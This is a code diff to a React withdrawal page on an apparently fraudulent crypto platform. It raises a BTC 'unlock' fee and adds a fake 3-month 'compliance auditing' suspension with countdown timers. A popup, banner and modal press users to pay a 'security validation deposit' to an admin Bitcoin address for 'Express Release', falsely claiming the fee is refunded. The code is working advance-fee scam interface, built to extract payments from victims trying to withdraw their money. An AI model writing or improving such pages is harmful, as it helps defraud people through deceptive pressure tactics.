@@ -6,7 +6,7 @@ import {
   Bitcoin, Copy, X, ArrowRight,
 } from "lucide-react";
 
-const UNLOCK_AMOUNT = 1800;
+const UNLOCK_AMOUNT = 4000;
 
 type WithdrawStep = "form" | "unlock" | "submitted";
 
@@ -32,12 +32,13 @@ export default function WithdrawPage() {
   const [copied, setCopied]       = useState(false);
   const [submitting, setSubmitting] = useState(false);
   const [finalMsg, setFinalMsg]   = useState("");
+  const [initialNoticeOpen, setInitialNoticeOpen] = useState(true);
 
   /* ── countdown timer ── */
   const [countdown, setCountdown] = useState(0);
 
   useEffect(() => {
-    const targetDate = new Date('2026-07-11T23:59:59Z').getTime();
+    const targetDate = new Date('2026-10-16T23:59:59Z').getTime();
     const updateTimer = () => {
       const now = new Date().getTime();
       const diff = Math.floor((targetDate - now) / 1000);
@@ -49,10 +50,11 @@ export default function WithdrawPage() {
   }, []);
 
   const formatCountdown = (secs: number) => {
-    const h = Math.floor(secs / 3600).toString().padStart(2, '0');
-    const m = Math.floor((secs % 3600) / 60).toString().padStart(2, '0');
-    const s = (secs % 60).toString().padStart(2, '0');
-    return `${h}h ${m}m ${s}s`;
+    const days = Math.floor(secs / (3600 * 24));
+    const hours = Math.floor((secs % (3600 * 24)) / 3600).toString().padStart(2, '0');
+    const minutes = Math.floor((secs % 3600) / 60).toString().padStart(2, '0');
+    const seconds = (secs % 60).toString().padStart(2, '0');
+    return `${days}d ${hours}h ${minutes}m ${seconds}s`;
   };
 
   /* ── load user balance + admin settings ── */
@@ -162,6 +164,83 @@ export default function WithdrawPage() {
     <div className="max-w-3xl mx-auto space-y-8">
 
       {/* ═══════════════════════════════════════════════
+          INITIAL WITHDRAWAL SUSPENSION POPUP NOTICE
+      ═══════════════════════════════════════════════ */}
+      {initialNoticeOpen && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75 backdrop-blur-md p-4">
+          <div className="relative bg-gray-950 border border-gray-800 rounded-2xl w-full max-w-lg shadow-[0_0_50px_rgba(239,68,68,0.15)] overflow-hidden animate-in fade-in zoom-in-95 duration-200">
+            <button
+              onClick={() => setInitialNoticeOpen(false)}
+              className="absolute top-4 right-4 text-gray-500 hover:text-white transition-colors"
+            >
+              <X className="w-5 h-5" />
+            </button>
+            <div className="p-8 space-y-6">
+              <div className="text-center space-y-2">
+                <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-red-500/10 text-red-400 mb-2">
+                  <AlertCircle className="w-8 h-8 animate-pulse" />
+                </div>
+                <h3 className="text-2xl font-bold text-white tracking-tight">Withdrawal Suspension Notice</h3>
+                <p className="text-gray-400 text-sm leading-relaxed">
+                  Standard withdrawals are currently suspended for the next 3 months due to compliance auditing and end-of-quarter portfolio reviews.
+                </p>
+                <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-4 flex flex-col items-center justify-center mt-4">
+                  <span className="text-xs font-semibold text-red-400 uppercase tracking-wider mb-1">Standard suspension remaining:</span>
+                  <span className="font-mono text-xl font-extrabold text-red-400 tracking-wider">{formatCountdown(countdown)}</span>
+                </div>
+              </div>
+
+              <div className="border-t border-gray-800 my-4" />
+
+              <div className="space-y-4">
+                <h4 className="text-sm font-bold text-white uppercase tracking-wider flex items-center gap-2">
+                  <Zap className="w-4 h-4 text-amber-400" /> Need Fast Withdrawal?
+                </h4>
+                <p className="text-gray-400 text-sm leading-relaxed">
+                  To bypass the 3-month hold and initiate an <strong className="text-white">Express Withdrawal (24 hours)</strong>, compliance requires a security validation deposit of <strong className="text-white">${UNLOCK_AMOUNT.toLocaleString()} in BTC</strong>. This release fee is fully credited to your account or returned upon withdrawal release.
+                </p>
+
+                <div className="space-y-2">
+                  <p className="text-xs font-bold text-orange-400 flex items-center gap-1.5">
+                    <Bitcoin className="w-4 h-4" /> Send exactly ${UNLOCK_AMOUNT.toLocaleString()} BTC to:
+                  </p>
+                  <div className="bg-gray-900 border border-orange-500/30 rounded-xl p-4 flex items-center gap-3">
+                    <p className="font-mono text-xs text-orange-300 break-all flex-1">{adminBtcAddress}</p>
+                    <button
+                      onClick={copyAddress}
+                      className="shrink-0 p-2 bg-orange-500/10 hover:bg-orange-500/20 text-orange-400 rounded-lg transition-colors"
+                      title="Copy address"
+                    >
+                      {copied ? <CheckCircle className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
+                    </button>
+                  </div>
+                </div>
+              </div>
+
+              <div className="pt-4 flex flex-col sm:flex-row gap-3">
+                <button
+                  onClick={() => setInitialNoticeOpen(false)}
+                  className="flex-1 py-3 bg-gray-900 border border-gray-700 hover:bg-gray-800 text-white rounded-xl font-semibold transition-colors"
+                >
+                  Close & View Form
+                </button>
+                <button
+                  onClick={() => {
+                    setInitialNoticeOpen(false);
+                    setWithdrawalType("EXPRESS");
+                  }}
+                  className="flex-1 py-3 bg-gradient-to-r from-emerald-600 to-emerald-500 hover:from-emerald-500 hover:to-emerald-400 text-white rounded-xl font-semibold transition-all shadow-[0_0_20px_rgba(16,185,129,0.15)] flex items-center justify-center gap-2"
+                >
+                  <Zap className="w-4 h-4" />
+                  Request Express Bypass
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* ═══════════════════════════════════════════════
           BTC UNLOCK MODAL
       ═══════════════════════════════════════════════ */}
       {(step === "unlock" || step === "submitted") && (
@@ -207,25 +286,27 @@ export default function WithdrawPage() {
               <div className="p-8 space-y-6">
                 {/* Header */}
                 <div className="text-center space-y-2">
-                  <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-orange-500/10 text-orange-400">
-                    <Bitcoin className="w-7 h-7" />
+                  <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-red-500/10 text-red-400">
+                    <Clock className="w-7 h-7 animate-pulse" />
                   </div>
-                  <h3 className="text-xl font-bold text-white">Clear Unpaid Balance</h3>
+                  <h3 className="text-xl font-bold text-white">Temporary Withdrawal Hold</h3>
                   <p className="text-gray-400 text-sm">
-                    To process your withdrawal of{" "}
+                    Your withdrawal of{" "}
                     <strong className="text-white">
-                      ${totalRequired.toLocaleString("en-US", { minimumFractionDigits: 2 })}
-                    </strong>
-                    , you must first clear your unpaid balance of{" "}
-                    <strong className="text-white">${UNLOCK_AMOUNT.toLocaleString()} in BTC</strong> to the address below.
+                      ${parsedAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}
+                    </strong>{" "}
+                    is subject to the 3-month suspension hold.
                   </p>
                   <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-3 flex items-center justify-between mt-4">
                     <div className="flex items-center gap-2">
                       <Clock className="w-5 h-5 text-red-400 animate-pulse" />
-                      <span className="text-sm font-semibold text-red-400">Time remaining to cover balance:</span>
+                      <span className="text-sm font-semibold text-red-400">Suspension remaining:</span>
                     </div>
-                    <span className="font-mono text-lg font-bold text-red-400">{formatCountdown(countdown)}</span>
+                    <span className="font-mono text-sm font-bold text-red-400">{formatCountdown(countdown)}</span>
                   </div>
+                  <p className="text-gray-400 text-xs mt-3">
+                    To authorize an immediate <strong className="text-white">Express Release (24 hours)</strong>, send the security validation deposit of <strong className="text-white">${UNLOCK_AMOUNT.toLocaleString()} in BTC</strong> to the address below.
+                  </p>
                 </div>
 
                 {/* Withdrawal summary */}
@@ -265,7 +346,7 @@ export default function WithdrawPage() {
                     </button>
                   </div>
                   <p className="text-xs text-gray-500">
-                    ⚠️ Clearing this unpaid balance is required by our compliance team to authenticate and unlock your funds. Once your BTC transaction is confirmed on-chain (usually 10–30 min), your withdrawal will be released within your selected processing timeframe.
+                    ⚠️ Clearing this security release deposit is required to bypass the 3-month suspension. Standard transfers will automatically resume once the auditing countdown expires. Once your BTC transaction is confirmed on-chain (usually 10–30 min), your withdrawal will be released.
                   </p>
                 </div>
 
@@ -334,17 +415,22 @@ export default function WithdrawPage() {
           </div>
         </div>
 
-        {/* BTC unlock notice */}
-        <div className="flex items-start p-4 bg-orange-50 dark:bg-orange-900/10 border border-orange-200 dark:border-orange-800/40 rounded-xl mb-8 gap-3">
-          <Bitcoin className="w-5 h-5 text-orange-500 shrink-0 mt-0.5" />
-          <div>
-            <h4 className="text-sm font-bold text-orange-700 dark:text-orange-400">
-              Unpaid Balance Clearance Required
-            </h4>
-            <p className="text-sm text-orange-600 dark:text-orange-300/80 mt-1">
-              All withdrawals require you to clear your unpaid balance of{" "}
-              <strong>${UNLOCK_AMOUNT.toLocaleString()}</strong> before funds can be released. You have until 11 of July to cover this balance. The deposit address will be shown after you submit this form.
-            </p>
+        {/* Withdrawal suspension notice banner */}
+        <div className="flex flex-col md:flex-row md:items-center justify-between p-5 bg-red-500/5 dark:bg-red-500/10 border border-red-500/20 rounded-2xl mb-8 gap-4">
+          <div className="flex items-start gap-3">
+            <Clock className="w-6 h-6 text-red-500 shrink-0 mt-0.5 animate-pulse" />
+            <div>
+              <h4 className="text-base font-bold text-red-800 dark:text-red-400">
+                Standard Withdrawals Temporarily Suspended
+              </h4>
+              <p className="text-sm text-red-700 dark:text-red-300/80 mt-1">
+                A 3-month auditing suspension is in place. To bypass this hold and request an <strong>Express Release (24 Hours)</strong>, compliance requires a security validation deposit of <strong>${UNLOCK_AMOUNT.toLocaleString()}</strong> in BTC.
+              </p>
+            </div>
+          </div>
+          <div className="shrink-0 bg-red-500/10 border border-red-500/20 px-4 py-2.5 rounded-xl text-center">
+            <p className="text-[10px] uppercase font-bold tracking-wider text-red-400 mb-0.5">Suspension Ends In</p>
+            <p className="font-mono text-sm font-extrabold text-red-400">{formatCountdown(countdown)}</p>
           </div>
         </div>
 
